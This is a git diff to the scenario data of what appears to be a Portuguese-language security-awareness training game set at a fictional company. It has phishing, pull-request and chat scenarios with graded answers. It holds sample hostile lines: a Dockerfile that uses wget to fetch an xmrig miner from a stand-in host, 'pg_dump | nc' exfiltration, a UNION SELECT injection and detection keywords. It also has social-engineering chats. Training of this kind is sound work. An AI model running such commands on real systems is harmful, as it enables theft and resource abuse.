@@ -75,19 +75,33 @@ const CAMPAIGN_SHIFTS = [
       <ul>
         <li><code>@techcore.com</code>: Uso geral para colaboradores, analistas, desenvolvedores e diretoria.</li>
         <li><code>@techcore-hr.com</code>: Uso exclusivo para comunicados e informativos do setor de Recursos Humanos.</li>
-        <li><strong>Atenção:</strong> Variações como <code>@tech-core.com</code> (com hífen), <code>@techcore-beneficios.com</code> ou extensões externas não pertencem à empresa.</li>
+        <li><strong>Atenção:</strong> Variações como <code>@tech-core.com</code> (com hífen), <code>@techcore-beneficios.com</code> ou extensões externas <strong>não pertencem à empresa</strong>.</li>
       </ul>
 
       <h2>2. REPOSITÓRIOS OFICIAIS NO GITHUB (@TechCore-Official)</h2>
-      <p>Qualquer alteração em código-fonte deve pertencer rigorosamente aos seguintes repositórios homologados:</p>
+      <p>Qualquer Pull Request (PR) deve pertencer a um repositório oficial. São eles:</p>
       <ul>
-        <li><code>core-api-v2</code>: Microsserviço central de pagamentos e checkout PIX.</li>
-        <li><code>auth-service</code>: Serviço de autenticação e validação de tokens JWT.</li>
-        <li><code>deploy-pipeline</code>: Pipeline automatizado de CI/CD para deploy em produção.</li>
+        <li><code>core-api-v2</code> — API central de pagamentos e checkout PIX.</li>
+        <li><code>auth-service</code> — Autenticação e tokens de segurança.</li>
+        <li><code>deploy-pipeline</code> — Sistema de entrega automática de software (CI/CD).</li>
+      </ul>
+      <p><strong>⚠️ O que verificar em cada PR do GitHub:</strong></p>
+      <ul>
+        <li><strong>Repositório:</strong> O PR está em um dos 3 repositórios oficiais acima? Se não estiver → <strong>REJEITAR</strong>.</li>
+        <li><strong>Autor:</strong> O autor é um colaborador oficial <code>@techcore.com</code>? E-mails externos são suspeitos.</li>
+        <li><strong>No diff (código alterado), procure por:</strong>
+          <ul>
+            <li>Palavras como <code>curl</code>, <code>wget</code>, <code>nc</code> (netcat) enviando dados para fora.</li>
+            <li>URLs externas suspeitas (ex: <code>exfil-c2.net</code>, <code>mine-pool.org</code>) — são servidores de atacantes.</li>
+            <li>Referências a <code>xmrig</code> ou mineradores de criptomoeda.</li>
+            <li><code>$AWS_SECRET</code>, <code>$TOKEN</code> sendo enviados para fora da empresa.</li>
+          </ul>
+        </li>
+        <li><strong>Se o diff parece limpo e o autor é oficial:</strong> É seguro aprovar.</li>
       </ul>
 
       <h2>3. CONTROLE DE ACESSO E GESTÃO DE PRIVILÉGIOS (IAM)</h2>
-      <p>A concessão de privilégios segue estritamente o princípio de menor privilégio. Solicitações de privilégios de Administrador ou ClusterAdmin em Produção sem chamado aprovado por <code>beatriz.sec</code> devem ser sumariamente indeferidas.</p>
+      <p>A concessão de privilégios segue o princípio de menor privilégio. Solicitações de Admin ou ClusterAdmin em Produção <strong>sem chamado aprovado por <code>beatriz.sec</code></strong> devem ser rejeitadas.</p>
     `,
     ceoDialogues: [
       {
@@ -141,14 +155,14 @@ const CAMPAIGN_SHIFTS = [
         senderEmail: 'carlos.dev@techcore.com',
         avatarChar: 'C',
         avatarColor: '#2e7d32',
-        subject: 'PR #142: Otimização de queries no endpoint de checkout PIX',
-        snippet: 'Refatoração de índices e paginação no repositório oficial core-api-v2...',
+        subject: 'PR #142: Melhoria de performance na consulta de pagamentos PIX',
+        snippet: 'Repositório: core-api-v2 | Autor oficial @techcore.com | Diff limpo sem URLs externas',
         meta: { 'De': 'carlos.dev (Sênior)', 'Para': '@TechCore-Official / core-api-v2', 'Data': '10:55', 'Segurança': 'GPG Signature: VALID' },
-        body: `<p>PR #142 no repositório <code>core-api-v2</code>:</p><div class="email-quote-box"><p>Adicionado índice na consulta de ordens PIX para reduzir latência de banco.</p></div>`,
-        inspector: { type: 'diff', label: 'Git Diff (core-api-v2/src/pix.ts)', diff: [{ type: 'info', text: '@@ -45,4 +45,4 @@' }, { type: 'removed', text: '- const q = db.query("SELECT * FROM orders");' }, { type: 'added', text: '+ const q = db.query("SELECT id, amount, status FROM orders USE INDEX (idx_date)");' }] },
+        body: `<p>PR #142 — Repositório oficial: <code>core-api-v2</code></p><div class="email-quote-box"><p>✅ <strong>Autor:</strong> carlos.dev@techcore.com (funcionário oficial)<br>✅ <strong>Repositório:</strong> core-api-v2 (repositório oficial da lista)<br>✅ <strong>Diff:</strong> Apenas otimização de consulta de banco — sem URLs externas, sem envio de dados para fora.</p></div>`,
+        inspector: { type: 'diff', label: 'Git Diff (core-api-v2/src/pix.ts) — Inspecione o código alterado', diff: [{ type: 'info', text: '@@ -45,4 +45,4 @@ // Consulta de pedidos PIX' }, { type: 'removed', text: '- const q = db.query("SELECT * FROM orders");  // busca tudo (lento)' }, { type: 'added', text: '+ const q = db.query("SELECT id, amount, status FROM orders USE INDEX (idx_date)");  // busca só o necessário (rápido)' }] },
         actions: [
-          { id: 'a1', label: '✅ Aprovar e Fazer Merge', correct: true, toastMsg: 'PR aprovado com sucesso.', logTitle: 'PR Legítimo Integrado', consequence: 'Deploy de pagamentos realizado com segurança.', explanation: 'Desenvolvedor oficial autorizado (carlos.dev) e repositório oficial core-api-v2.' },
-          { id: 'a2', label: '❌ Rejeitar e Bloquear PR', correct: false, toastMsg: 'PR bloqueado.', logTitle: 'Falso Positivo em PR', consequence: 'Atraso indevido na entrega de features críticas.', explanation: 'carlos.dev é membro sênior oficial e o diff estava limpo.' }
+          { id: 'a1', label: '✅ Aprovar e Fazer Merge', correct: true, toastMsg: 'PR aprovado com sucesso.', logTitle: 'PR Legítimo Integrado', consequence: 'Deploy de pagamentos realizado com segurança.', explanation: 'Desenvolvedor oficial autorizado (carlos.dev@techcore.com) e repositório oficial core-api-v2. O diff não contém URLs externas, curl, wget ou envio de dados.' },
+          { id: 'a2', label: '❌ Rejeitar e Bloquear PR', correct: false, toastMsg: 'PR bloqueado.', logTitle: 'Falso Positivo em PR', consequence: 'Atraso indevido na entrega de features críticas.', explanation: 'carlos.dev é membro sênior oficial e o diff estava completamente limpo.' }
         ]
       },
       {
@@ -195,14 +209,14 @@ const CAMPAIGN_SHIFTS = [
         senderEmail: 'shadow.dev@external.net',
         avatarChar: 'S',
         avatarColor: '#616161',
-        subject: 'PR #1: Adicionar container worker para relatórios noturnos',
-        snippet: 'Criando repositório crypto-worker-node com container xmrig...',
-        meta: { 'De': 'shadow.dev', 'Para': 'crypto-worker-node', 'Data': '17:15', 'Segurança': 'Repositório Não Cadastrado' },
-        body: `<p>PR #1 no repositório <code>crypto-worker-node</code>:</p><div class="email-quote-box"><p>Adicionando container de execução em lote para relatórios.</p></div>`,
-        inspector: { type: 'diff', label: 'Git Diff (crypto-worker-node/Dockerfile)', diff: [{ type: 'info', text: '@@ -1,2 +1,4 @@' }, { type: 'added', text: '+ RUN wget https://mine-pool.org/xmrig.tar.gz' }, { type: 'added', text: '+ ENTRYPOINT ["./xmrig", "-o", "stratum+tcp://mine-pool.org:3333"]' }] },
+        subject: 'PR #1: Adicionar container de processamento noturno [REPOSITÓRIO DESCONHECIDO]',
+        snippet: '⚠️ Repositório: crypto-worker-node (NÃO OFICIAL) | Autor: shadow.dev@external.net (EXTERNO) | Diff com download suspeito',
+        meta: { 'De': 'shadow.dev (Conta Externa)', 'Para': 'crypto-worker-node', 'Data': '17:15', 'Segurança': 'Repositório Não Cadastrado' },
+        body: `<p>PR #1 — Repositório: <code>crypto-worker-node</code></p><div class="email-quote-box"><p>🚩 <strong>Autor:</strong> shadow.dev@external.net — <strong>e-mail externo, não é @techcore.com</strong>.<br>🚩 <strong>Repositório:</strong> <code>crypto-worker-node</code> — <strong>não está na lista de repositórios oficiais</strong> (core-api-v2, auth-service, deploy-pipeline).<br>🚩 <strong>Diff:</strong> Contém <code>wget</code> baixando arquivo de site externo e comando suspeito de minerador.</p></div>`,
+        inspector: { type: 'diff', label: 'Git Diff (crypto-worker-node/Dockerfile) — 🚨 ATENÇÃO AOS COMANDOS ABAIXO', diff: [{ type: 'info', text: '@@ -1,2 +1,4 @@ # Dockerfile — veja o que está sendo instalado:' }, { type: 'added', text: '+ RUN wget https://mine-pool.org/xmrig.tar.gz   ← baixando programa de site externo desconhecido' }, { type: 'added', text: '+ ENTRYPOINT ["./xmrig", "-o", "stratum+tcp://mine-pool.org:3333"]  ← minerador de criptomoeda' }] },
         actions: [
-          { id: 'a1', label: '✅ Aprovar PR e Deploy', correct: false, toastMsg: 'Deploy realizado.', logTitle: 'Injeção de Cryptominer', consequence: 'Minerador de Monero implantado nos servidores da nuvem.', explanation: 'Repositório não oficial com comando explícito do minerador xmrig.' },
-          { id: 'a2', label: '🚫 Fechar PR e Banir Usuário', correct: true, toastMsg: 'Ameaça banida.', logTitle: 'Cryptominer Bloqueado', consequence: 'Uso indevido de recursos da infraestrutura prevenido.', explanation: 'Excelente! Apenas core-api-v2, auth-service e deploy-pipeline são repositórios oficiais.' }
+          { id: 'a1', label: '✅ Aprovar PR e Deploy', correct: false, toastMsg: 'Deploy realizado.', logTitle: 'Injeção de Cryptominer', consequence: 'Minerador de Monero implantado nos servidores da nuvem, consumindo recursos e gerando prejuízo.', explanation: 'O repositório crypto-worker-node não é oficial. O diff usa wget para baixar xmrig (minerador de criptomoeda) de um site externo.' },
+          { id: 'a2', label: '🚫 Fechar PR e Banir Usuário', correct: true, toastMsg: 'Ameaça banida.', logTitle: 'Cryptominer Bloqueado', consequence: 'Uso indevido de recursos da infraestrutura prevenido.', explanation: 'Perfeito! Você identificou: repositório não oficial + autor externo + wget de site suspeito + minerador xmrig.' }
         ]
       }
     ]
@@ -234,7 +248,19 @@ const CAMPAIGN_SHIFTS = [
         <li><strong>Atenção:</strong> Qualquer solicitação de operação crítica por e-mail proveniente de domínio diferente de <code>@techcore.com</code> deve ser negada imediatamente.</li>
       </ul>
 
-      <h2>3. MONITORAMENTO CONTÍNUO DE E-MAILS E CI/CD</h2>
+      <h2>4. O QUE SÃO "CONSULTAS SQL"? (GUIA RÁPIDO PARA ANALISTAS)</h2>
+      <p><strong>SQL</strong> é a linguagem usada para conversar com o banco de dados. Pense como um "pedido de informação". Exemplos do que cada comando faz:</p>
+      <ul>
+        <li><code>SELECT</code> — Lê dados. Ex: "Me mostre todos os pedidos PIX de hoje." ✅ Normal.</li>
+        <li><code>INSERT</code> — Adiciona dados. Ex: "Registre esse novo pagamento." ✅ Normal se vem do usuário certo.</li>
+        <li><code>CREATE ROLE ... SUPERUSER</code> — Cria um usuário com poderes absolutos no banco. 🚨 <strong>Proibido sem autorização.</strong></li>
+        <li><code>DROP TABLE</code> — <strong>Apaga uma tabela inteira</strong> permanentemente. 🚨 <strong>Proibido sem ticket aprovado.</strong></li>
+        <li><code>pg_dump | nc IP_EXTERNO</code> — Exporta o banco inteiro e envia para um IP de fora. 🚨 <strong>Ataque de exfiltração.</strong></li>
+        <li><code>UNION SELECT ... FROM admin_users</code> — Truque hacker para roubar dados de tabelas secretas junto com uma consulta normal. 🚨 <strong>Ataque de SQL Injection.</strong></li>
+      </ul>
+      <p><strong>Resumo prático:</strong> Quando vir uma "consulta SQL" no TechDB, pergunte: <em>Quem está executando? O usuário está autorizado? O comando faz algo destrutivo ou envia dados para fora?</em></p>
+
+      <h2>5. MONITORAMENTO CONTÍNUO DE E-MAILS E CI/CD</h2>
       <p>Mesmo durante a auditoria de banco de dados, e-mails de phishing (ex: <code>@tech-core.com</code> com hífen ou <code>@techcore-beneficios.com</code>) e alterações maliciosas em workflows de CI/CD continuam ativos.</p>
     `,
     ceoDialogues: [
@@ -458,137 +484,262 @@ const CAMPAIGN_SHIFTS = [
         id: 's3-1',
         channel: 'zap',
         time: '09:40',
-        senderName: 'carlos.dev (Via TechZap)',
+        senderName: 'carlos.dev',
         senderEmail: '+55 11 98765-4321',
         avatarChar: 'C',
         avatarColor: '#2e7d32',
-        subject: '[CHAT TECHZAP] carlos.dev: "Preciso de reset do meu 2FA urgente!"',
-        snippet: 'Troquei de celular agora e perdi o 2FA. Pode desativar pra mim rapidão?...',
+        subject: 'carlos.dev: "Preciso de reset do meu 2FA urgente!"',
+        snippet: 'Troquei de celular agora e perdi o 2FA. Pode desativar pra mim rapidão?',
         meta: { 'Contato': 'carlos.dev (Sessão Web Nova)', 'Localização IP': 'São Petersburgo, Rússia', 'Data': '09:38', 'Crachá Informado': '#DEV-999' },
-        body: `
-          <div class="techzap-chat-card">
-            <div class="chat-bubble-incoming">
-              <strong>carlos.dev:</strong><br>
-              "Fala meu bom! Cara, comprei um celular novo no shopping e perdi o aplicativo de 2FA do autenticador. Desativa o 2FA da minha conta aí rapidão que preciso subir um deploy agora em 5 minutos!"
-            </div>
-            <div class="chat-bubble-challenge">
-              <strong>Você (Analista):</strong> "Carlos, para sua segurança, confirme o número do seu crachá e seu projeto principal."<br>
-              <strong>carlos.dev:</strong> "Ah pô, crachá é #DEV-999 e o projeto é crypto-worker! Libera logo mano, tô com pressa!"
-            </div>
-          </div>
-        `,
-        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP: 185.220.101.9 (Rússia) | Crachá Informado: #DEV-999' },
+        body: `<div class="techzap-screen">
+  <div class="wz-topbar">
+    <span class="wz-topbar-back">←</span>
+    <div class="wz-topbar-avatar" style="background:#2e7d32;">C</div>
+    <div class="wz-topbar-info">
+      <div class="wz-topbar-name">carlos.dev</div>
+      <div class="wz-topbar-status">+55 11 98765-4321 · online</div>
+    </div>
+    <div class="wz-topbar-icons"><span>📞</span><span>⋮</span></div>
+  </div>
+  <div class="wz-chat-bg">
+    <div class="wz-date-label">HOJE</div>
+    <div class="wz-msg-row incoming">
+      <div class="wz-msg-avatar" style="background:#2e7d32;">C</div>
+      <div class="wz-bubble">
+        <div class="wz-bubble-sender">carlos.dev</div>
+        Fala meu bom! Cara, comprei um celular novo no shopping e perdi o aplicativo de 2FA do autenticador. Desativa o 2FA da minha conta aí rapidão que preciso subir um deploy agora em 5 minutos! 🙏
+        <div class="wz-bubble-footer"><span class="wz-bubble-time">09:38</span></div>
+      </div>
+    </div>
+    <div class="wz-msg-row outgoing">
+      <div class="wz-msg-avatar">A</div>
+      <div class="wz-bubble">
+        Carlos, para sua segurança preciso confirmar sua identidade. Qual é o número do seu crachá corporativo e seu projeto principal?
+        <div class="wz-bubble-footer"><span class="wz-bubble-time">09:39</span><span class="wz-ticks">✓✓</span></div>
+      </div>
+    </div>
+    <div class="wz-msg-row incoming">
+      <div class="wz-msg-avatar" style="background:#2e7d32;">C</div>
+      <div class="wz-bubble">
+        Ah pô, crachá é #DEV-999 e o projeto é crypto-worker! Libera logo mano, tô com pressa! 😤
+        <div class="wz-bubble-footer"><span class="wz-bubble-time">09:40</span></div>
+      </div>
+    </div>
+  </div>
+  <div class="wz-input-bar">
+    <span>😊</span>
+    <input class="wz-input-field" value="Digite uma mensagem..." readonly>
+    <button class="wz-send-btn">➤</button>
+  </div>
+</div>`,
+        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP de Origem: 185.220.101.9 (São Petersburgo, Rússia) | Crachá Informado: #DEV-999 | Projeto Informado: crypto-worker' },
         actions: [
-          { id: 'a1', label: '🔒 Bloquear Conta de carlos.dev & Invalidar Todas as Sessões', correct: true, toastMsg: 'Conta comprometida bloqueada.', logTitle: 'Invasor em Conta de Carlos Neutralizado', consequence: 'Sessão roubada pelo invasor derrubada e conta corporativa protegida.', explanation: 'Excelente investigação! No manual do Word, o crachá real de Carlos é #DEV-042.' },
-          { id: 'a2', label: '🔓 Desativar 2FA e Liberar Acesso', correct: false, toastMsg: '2FA desativado.', logTitle: 'Conta Corporativa Entregue a Invasor', consequence: 'A gangue assumiu o controle total da conta de desenvolvedor sênior de Carlos.', explanation: 'O contato era um golpista com IP da Rússia e crachá falso #DEV-999.' }
+          { id: 'a1', label: '🔒 Bloquear Conta de carlos.dev & Invalidar Todas as Sessões', correct: true, toastMsg: 'Conta comprometida bloqueada.', logTitle: 'Invasor em Conta de Carlos Neutralizado', consequence: 'Sessão roubada pelo invasor derrubada e conta corporativa protegida.', explanation: 'Excelente investigação! No manual do Word, o crachá real de Carlos é #DEV-042, não #DEV-999. Além disso, o IP vem da Rússia.' },
+          { id: 'a2', label: '🔓 Desativar 2FA e Liberar Acesso', correct: false, toastMsg: '2FA desativado.', logTitle: 'Conta Corporativa Entregue a Invasor', consequence: 'A gangue assumiu o controle total da conta de desenvolvedor sênior de Carlos.', explanation: 'O contato era um golpista com IP da Rússia e crachá falso #DEV-999 (o real é #DEV-042).' }
         ]
       },
       {
         id: 's3-2',
         channel: 'zap',
         time: '11:50',
-        senderName: 'beatriz.sec (Via TechZap)',
+        senderName: 'beatriz.sec',
         senderEmail: '+55 11 97654-3210',
         avatarChar: 'B',
         avatarColor: '#00897b',
-        subject: '[CHAT TECHZAP] beatriz.sec: "Confirmação de chave token para forense"',
-        snippet: 'Estou conduzindo a investigação #SEC-8921. Segue meu crachá e token...',
+        subject: 'beatriz.sec: "Confirmação de token para investigação forense"',
+        snippet: 'Olá Analista, sou a Beatriz de SecOps. Meu crachá é #SEC-8921...',
         meta: { 'Contato': 'beatriz.sec (SecOps)', 'Localização IP': 'São Paulo, Brasil (VPN TechCore)', 'Data': '11:48', 'Crachá Informado': '#SEC-8921' },
-        body: `
-          <div class="techzap-chat-card">
-            <div class="chat-bubble-incoming">
-              <strong>beatriz.sec:</strong><br>
-              "Olá Analista, sou a Beatriz de SecOps. Estou investigando a tentativa de brute force na API. Meu crachá é #SEC-8921 e meu projeto é auth-service. Pode validar meu token temporário de auditoria?"
-            </div>
-            <div class="chat-bubble-challenge">
-              <strong>Você (Analista):</strong> "Validação automática de MFA: Código 482-910."<br>
-              <strong>beatriz.sec:</strong> "Confirmado! Código 482-910 validado no meu app autenticador."
-            </div>
-          </div>
-        `,
-        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP: 177.18.22.5 (SP/Brasil - VPN Interna) | Crachá: #SEC-8921' },
+        body: `<div class="techzap-screen">
+  <div class="wz-topbar">
+    <span class="wz-topbar-back">←</span>
+    <div class="wz-topbar-avatar" style="background:#00897b;">B</div>
+    <div class="wz-topbar-info">
+      <div class="wz-topbar-name">beatriz.sec</div>
+      <div class="wz-topbar-status">+55 11 97654-3210 · online</div>
+    </div>
+    <div class="wz-topbar-icons"><span>📞</span><span>⋮</span></div>
+  </div>
+  <div class="wz-chat-bg">
+    <div class="wz-date-label">HOJE</div>
+    <div class="wz-msg-row incoming">
+      <div class="wz-msg-avatar" style="background:#00897b;">B</div>
+      <div class="wz-bubble">
+        <div class="wz-bubble-sender">beatriz.sec</div>
+        Olá Analista, sou a Beatriz de SecOps. Estou investigando a tentativa de brute force na API. Meu crachá é <strong>#SEC-8921</strong> e meu projeto é <strong>auth-service</strong>. Pode validar meu token temporário de auditoria?
+        <div class="wz-bubble-footer"><span class="wz-bubble-time">11:48</span></div>
+      </div>
+    </div>
+    <div class="wz-msg-row outgoing">
+      <div class="wz-msg-avatar">A</div>
+      <div class="wz-bubble">
+        Validação automática de MFA iniciada. Confirme o código: <strong>482-910</strong>
+        <div class="wz-bubble-footer"><span class="wz-bubble-time">11:49</span><span class="wz-ticks">✓✓</span></div>
+      </div>
+    </div>
+    <div class="wz-msg-row incoming">
+      <div class="wz-msg-avatar" style="background:#00897b;">B</div>
+      <div class="wz-bubble">
+        Confirmado! Código 482-910 validado no meu app autenticador ✅
+        <div class="wz-bubble-footer"><span class="wz-bubble-time">11:50</span></div>
+      </div>
+    </div>
+  </div>
+  <div class="wz-input-bar">
+    <span>😊</span>
+    <input class="wz-input-field" value="Digite uma mensagem..." readonly>
+    <button class="wz-send-btn">➤</button>
+  </div>
+</div>`,
+        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP de Origem: 177.18.22.5 (São Paulo, Brasil — VPN Interna TechCore) | Crachá: #SEC-8921 | MFA: VALIDADO' },
         actions: [
-          { id: 'a1', label: '✅ Confirmar Identidade e Validar Sessão', correct: true, toastMsg: 'Identidade de Beatriz validada.', logTitle: 'Colaboradora Legítima Confirmada', consequence: 'Investigação forense de Beatriz continuou sem atrasos.', explanation: 'Beatriz forneceu crachá correto (#SEC-8921), projeto correto e MFA válido.' },
-          { id: 'a2', label: '🔒 Bloquear Beatriz por Engano', correct: false, toastMsg: 'Beatriz bloqueada.', logTitle: 'Falso Positivo em Analista de Segurança', consequence: 'A analista de SecOps teve seu acesso cortado durante uma auditoria crítica.', explanation: 'Beatriz cumpriu rigorosamente todos os protocolos de autenticação.' }
+          { id: 'a1', label: '✅ Confirmar Identidade e Validar Sessão', correct: true, toastMsg: 'Identidade de Beatriz validada.', logTitle: 'Colaboradora Legítima Confirmada', consequence: 'Investigação forense de Beatriz continuou sem atrasos.', explanation: 'Beatriz forneceu crachá correto (#SEC-8921), projeto correto (auth-service), IP local via VPN e MFA válido.' },
+          { id: 'a2', label: '🔒 Bloquear Beatriz por Engano', correct: false, toastMsg: 'Beatriz bloqueada.', logTitle: 'Falso Positivo em Analista de Segurança', consequence: 'A analista de SecOps teve seu acesso cortado durante uma auditoria crítica.', explanation: 'Beatriz cumpriu rigorosamente todos os protocolos: crachá certo, IP de SP, MFA confirmado.' }
         ]
       },
       {
         id: 's3-3',
         channel: 'zap',
         time: '14:20',
-        senderName: 'marcos.rh (Via TechZap)',
+        senderName: 'marcos.rh',
         senderEmail: '+55 11 96543-2109',
         avatarChar: 'M',
         avatarColor: '#e91e63',
-        subject: '[CHAT TECHZAP] marcos.rh: "Me manda a chave privada SSL da empresa"',
-        snippet: 'Um auditor está aqui e precisa da chave privada do certificado SSL agora...',
+        subject: 'marcos.rh: "Me manda a chave privada SSL da empresa!"',
+        snippet: 'Estou numa reunião com auditores e precisam do arquivo private_key.pem agora...',
         meta: { 'Contato': 'marcos.rh (Sessão Anômala)', 'Localização IP': 'Bucareste, Romênia', 'Data': '14:18', 'Crachá Informado': 'Não soube responder' },
-        body: `
-          <div class="techzap-chat-card">
-            <div class="chat-bubble-incoming">
-              <strong>marcos.rh:</strong><br>
-              "Oi colega da TI, estou numa reunião com auditores do Ministério do Trabalho e eles exigiram que você envie o arquivo private_key.pem do certificado SSL da empresa por aqui agora!"
-            </div>
-            <div class="chat-bubble-challenge">
-              <strong>Você (Analista):</strong> "Marcos, o RH nunca lida com chaves SSL. Qual é o seu crachá corporativo?"<br>
-              <strong>marcos.rh:</strong> "Não interessa o crachá! Sou gerente e se você não mandar vou te advertir por insubordinação!"
-            </div>
-          </div>
-        `,
-        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP: 194.102.23.1 (Romênia) | Solicitação: private_key.pem' },
+        body: `<div class="techzap-screen">
+  <div class="wz-topbar">
+    <span class="wz-topbar-back">←</span>
+    <div class="wz-topbar-avatar" style="background:#e91e63;">M</div>
+    <div class="wz-topbar-info">
+      <div class="wz-topbar-name">marcos.rh</div>
+      <div class="wz-topbar-status">+55 11 96543-2109 · online</div>
+    </div>
+    <div class="wz-topbar-icons"><span>📞</span><span>⋮</span></div>
+  </div>
+  <div class="wz-chat-bg">
+    <div class="wz-date-label">HOJE</div>
+    <div class="wz-msg-row incoming">
+      <div class="wz-msg-avatar" style="background:#e91e63;">M</div>
+      <div class="wz-bubble">
+        <div class="wz-bubble-sender">marcos.rh</div>
+        Oi colega da TI! Estou numa reunião com auditores do Ministério do Trabalho e eles exigiram que você envie o arquivo <strong>private_key.pem</strong> do certificado SSL da empresa por aqui AGORA! É urgente! 😰
+        <div class="wz-bubble-footer"><span class="wz-bubble-time">14:18</span></div>
+      </div>
+    </div>
+    <div class="wz-msg-row outgoing">
+      <div class="wz-msg-avatar">A</div>
+      <div class="wz-bubble">
+        Marcos, o RH nunca lida com chaves SSL. Antes de qualquer ação, confirme seu número de crachá corporativo.
+        <div class="wz-bubble-footer"><span class="wz-bubble-time">14:19</span><span class="wz-ticks">✓✓</span></div>
+      </div>
+    </div>
+    <div class="wz-msg-row incoming">
+      <div class="wz-msg-avatar" style="background:#e91e63;">M</div>
+      <div class="wz-bubble">
+        Não interessa o crachá! Sou gerente aqui! Se você não mandar esse arquivo vou te advertir por insubordinação! 😡
+        <div class="wz-bubble-footer"><span class="wz-bubble-time">14:20</span></div>
+      </div>
+    </div>
+  </div>
+  <div class="wz-input-bar">
+    <span>😊</span>
+    <input class="wz-input-field" value="Digite uma mensagem..." readonly>
+    <button class="wz-send-btn">➤</button>
+  </div>
+</div>`,
+        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP de Origem: 194.102.23.1 (Bucareste, Romênia) | Solicitação: private_key.pem | Crachá: NÃO INFORMADO' },
         actions: [
-          { id: 'a1', label: '🔒 Bloquear Conta Imediatamente & Alertar CISO', correct: true, toastMsg: 'Conta fraudulenta bloqueada.', logTitle: 'Tentativa de Roubo de Certificado SSL Barrada', consequence: 'Tentativa de extorsão e roubo de chaves criptográficas abortada.', explanation: 'Perfeito! Chaves SSL nunca devem ser compartilhadas por mensagens de chat.' },
-          { id: 'a2', label: '📦 Enviar Arquivo private_key.pem', correct: false, toastMsg: 'Chave enviada.', logTitle: 'Vazamento Crítico de Chaves SSL', consequence: 'A gangue interceptou todo o tráfego HTTPS criptografado da empresa.', explanation: 'Chaves privadas nunca saem do cofre de servidores sob nenhuma hipótese.' }
+          { id: 'a1', label: '🔒 Bloquear Conta Imediatamente & Alertar CISO', correct: true, toastMsg: 'Conta fraudulenta bloqueada.', logTitle: 'Tentativa de Roubo de Certificado SSL Barrada', consequence: 'Tentativa de extorsão e roubo de chaves criptográficas abortada.', explanation: 'Perfeito! IP da Romênia, não soube informar o crachá e pediu arquivo de chave SSL — chaves nunca são enviadas por chat.' },
+          { id: 'a2', label: '📦 Enviar Arquivo private_key.pem', correct: false, toastMsg: 'Chave enviada.', logTitle: 'Vazamento Crítico de Chaves SSL', consequence: 'A gangue interceptou todo o tráfego HTTPS criptografado da empresa.', explanation: 'Chaves privadas nunca saem do cofre de servidores — jamais por WhatsApp ou chat.' }
         ]
       },
       {
         id: 's3-4',
         channel: 'zap',
         time: '16:05',
-        senderName: 'alex.intern (Via TechZap)',
+        senderName: 'alex.intern',
         senderEmail: '+55 11 95432-1098',
         avatarChar: 'A',
         avatarColor: '#f57c00',
-        subject: '[CHAT TECHZAP] alex.intern: "Dúvida sobre configuração da VPN de dev"',
-        snippet: 'Oi, estou com erro 403 no ambiente de staging. Segue meu chamado #STG-331...',
+        subject: 'alex.intern: "Erro de certificado no staging, ajuda?"',
+        snippet: 'Estou com erro 403 no ambiente de staging. Segue meu chamado #STG-331 e crachá #INT-007...',
         meta: { 'Contato': 'alex.intern (Estagiário)', 'Localização IP': 'São Paulo, Brasil', 'Data': '16:02', 'Chamado': '#STG-331' },
-        body: `
-          <div class="techzap-chat-card">
-            <div class="chat-bubble-incoming">
-              <strong>alex.intern:</strong><br>
-              "Oi time de TI, estou tentando rodar os testes do front-end no ambiente de staging e dá erro de certificado. Segue o chamado registrado no portal #STG-331 e meu crachá #INT-007. Podem me orientar?"
-            </div>
-          </div>
-        `,
-        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP: 177.18.22.88 (São Paulo) | Crachá: #INT-007 | Chamado: #STG-331' },
+        body: `<div class="techzap-screen">
+  <div class="wz-topbar">
+    <span class="wz-topbar-back">←</span>
+    <div class="wz-topbar-avatar" style="background:#f57c00;">A</div>
+    <div class="wz-topbar-info">
+      <div class="wz-topbar-name">alex.intern</div>
+      <div class="wz-topbar-status">+55 11 95432-1098 · online</div>
+    </div>
+    <div class="wz-topbar-icons"><span>📞</span><span>⋮</span></div>
+  </div>
+  <div class="wz-chat-bg">
+    <div class="wz-date-label">HOJE</div>
+    <div class="wz-msg-row incoming">
+      <div class="wz-msg-avatar" style="background:#f57c00;">A</div>
+      <div class="wz-bubble">
+        <div class="wz-bubble-sender">alex.intern</div>
+        Oi time de TI! Estou tentando rodar os testes do front-end no ambiente de staging e dá erro de certificado (403 Forbidden). Segue o chamado registrado no portal: <strong>#STG-331</strong> e meu crachá: <strong>#INT-007</strong>. Podem me orientar? 🙏
+        <div class="wz-bubble-footer"><span class="wz-bubble-time">16:02</span></div>
+      </div>
+    </div>
+  </div>
+  <div class="wz-input-bar">
+    <span>😊</span>
+    <input class="wz-input-field" value="Digite uma mensagem..." readonly>
+    <button class="wz-send-btn">➤</button>
+  </div>
+</div>`,
+        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP de Origem: 177.18.22.88 (São Paulo, Brasil) | Crachá: #INT-007 ✓ | Chamado: #STG-331 ✓' },
         actions: [
-          { id: 'a1', label: '📨 Responder com Link da Documentação da Intranet', correct: true, toastMsg: 'Orientação enviada.', logTitle: 'Suporte Interno Prestado', consequence: 'Estagiário configurou o certificado de staging corretamente.', explanation: 'Contato legítimo de suporte que não envolveu vazamento ou quebra de regras.' },
-          { id: 'a2', label: '🔒 Bloquear Alex como Suspeito', correct: false, toastMsg: 'Alex bloqueado.', logTitle: 'Bloqueio Indevido de Suporte', consequence: 'Estagiário ficou sem trabalhar por bloqueio incorreto.', explanation: 'Alex forneceu o crachá correto #INT-007 e chamado regular registrado.' }
+          { id: 'a1', label: '📨 Responder com Link da Documentação da Intranet', correct: true, toastMsg: 'Orientação enviada.', logTitle: 'Suporte Interno Prestado', consequence: 'Estagiário configurou o certificado de staging corretamente.', explanation: 'Contato legítimo: IP de SP, crachá #INT-007 correto e chamado #STG-331 registrado — tudo conferido.' },
+          { id: 'a2', label: '🔒 Bloquear Alex como Suspeito', correct: false, toastMsg: 'Alex bloqueado.', logTitle: 'Bloqueio Indevido de Suporte', consequence: 'Estagiário ficou sem trabalhar por bloqueio incorreto.', explanation: 'Alex forneceu crachá correto #INT-007 e chamado regular. Não há nenhum sinal de perigo.' }
         ]
       },
       {
         id: 's3-5',
